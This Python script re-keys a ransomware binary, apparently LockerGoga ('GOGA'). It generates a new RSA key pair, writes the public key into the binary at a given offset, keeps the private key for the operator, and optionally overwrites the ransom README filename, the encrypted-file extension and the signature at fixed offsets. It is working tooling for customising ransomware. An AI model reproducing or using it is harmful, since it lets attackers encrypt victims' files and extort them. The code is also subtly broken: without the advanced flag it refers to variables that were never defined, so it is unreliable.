#!/usr/bin/env python
# -*- coding: utf-8 -*-

from Crypto.PublicKey import RSA
from Crypto import Random
from shutil import copyfile
import argparse
from struct import pack


def gen_key_patch(file_patch, file_offset, private_key_file='private_key.pem',
                  public_key_file='public_key.pem', advanced_flag=False):
    print('Generating RSA key...')
    rsa_key = RSA.generate(1024, Random.new().read)  # generates key
    print('RSA key generated!')

    print('Exporting RSA private key...')
    prv_exported = rsa_key.exportKey()  # exports private key as format
    print('RSA private key exported!')

    print('Exporting RSA public key...')
    pub_exported = rsa_key.publickey().exportKey()  # public key exported
    print('RSA public key exported!')

    print('Backing up file (%s)...' % file_patch)
    copyfile(file_patch, file_patch + '_backup')

    # PATCHING FILE WITH PUBLIC KEY
    print('Patching provided file (%s) using offset (%s)...' % (file_patch, hex(file_offset)))
    if advanced_flag:  # patching README filename  # TODO: confirm all of this works well, implement other features
        # TODO: implement other features suck as changing file ext and version/goga tags

        # README FILENAME
        p_readme_filename_val = ''
        while True:
            p_readme_filename_val = input('Provide a README filename of 17 characters or less (enter to skip): ')
            if len(p_readme_filename_val) <= 17:
                break
            print('The provided filename is too large: %d characters.' % len(p_readme_filename_val))

        # ENCRYPTED FILE EXTENSION
        p_encr_ext_val = ''
        while True:
            p_encr_ext_val = input('Provide an extension for encrypted files 6 characters or less (enter to skip): ')
            if len(p_encr_ext_val) <= 6:
                break
            print('The provided extension is too large: %d characters.' % len(p_encr_ext_val))

        # README FILE SIGNATURE
        p_readme_signature_val = ''
        while True:
            p_readme_signature_val = input('Provide a signature of 48 characters or less (enter to skip): ')
            if len(p_readme_signature_val) <= 48:
                break
            print('The provided signature is too large: %d characters.' % len(p_readme_signature_val))

    with open(file_patch, 'r+b') as patch_file:  # open file to patch
        parsed_public_key = pub_exported[27:-25]  # parse public key data
        patch_file.seek(file_offset)  # move to public key
        patch_file.write(parsed_public_key)  # parses extra from PEM public key

        if p_readme_filename_val:
            p_readme_filename_pack = pack('18s', bytes(p_readme_filename_val, 'utf-8'))
            patch_file.seek(0xFCF7C)
            patch_file.write(p_readme_filename_pack)

        if p_encr_ext_val:
            p_encr_ext_pack = pack('14s', bytes(p_encr_ext_val, 'utf-16')[2:])
            patch_file.seek(0xFCF06)
            patch_file.write(p_encr_ext_pack)

        if p_readme_signature_val:
            p_readme_signature_pack = pack('49s', bytes(p_readme_signature_val, 'utf-8'))
            patch_file.seek(0xFCF44)
            patch_file.write(p_readme_signature_pack)

    print('File (%s) patched!' % file_patch)

    # PRIVATE KEY FILE
    print('Writing new private key to %s...' % private_key_file)
    with open(private_key_file, 'wb') as priv_file: # opens new private key file
        priv_file.write(prv_exported)  # write private key data to file
    print('New private key written to %s!' % private_key_file)

    # PUBLIC KEY FILE
    print('Writing new public key to %s...' % public_key_file)
    with open(public_key_file, 'wb') as pub_file:  # opens new public key file
        pub_file.write(pub_exported)  # write public key data to file
    print('New public key written to %s!' % public_key_file)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Accepts a minimum of a file to patch and file offset then generates '
                                                 'a binary patched with a newly generated public key.')

    parser.add_argument('in_file', metavar='FILENAME', type=str, nargs=1,
                        help='file that is to be patched with the public key')
    parser.add_argument('offset', metavar='OFFSET', type=str, nargs=1,
                        help='decimal/hexadecimal (with 0x) offset start of patch')
    parser.add_argument('--out_private', '--priv', metavar='FILENAME', type=str, nargs=1,
                        help='output filename for the newly generated private key')
    parser.add_argument('--out_public', '--pub', metavar='FILENAME', type=str, nargs=1,
                        help='output filename for the newly generated public key')
    parser.add_argument('--advanced', action='store_true',
                        help='flag for advanced patching features, should only be used for known GOGA versions')
    args = parser.parse_args()

    if not len(args.in_file) and len(args.offset):
        raise Exception('Missing required positional arguments: in_file and offset!')  # not likely to be raised

    in_file = args.in_file[0]
    offset = int(args.offset[0].replace('\u202c', ''), 0)  # unicode char is added to end requiring parse of last char
    # the previous line also parses the input as either hexadecimal or decimal
    advanced_flag = args.advanced
    out_private = args.out_private[0] if args.out_private else 'private_key.pem'
    out_public = args.out_public[0] if args.out_public else 'public_key.pem'

    gen_key_patch(in_file, offset, out_private, out_public, advanced_flag)

    print('Exiting!')
    exit()

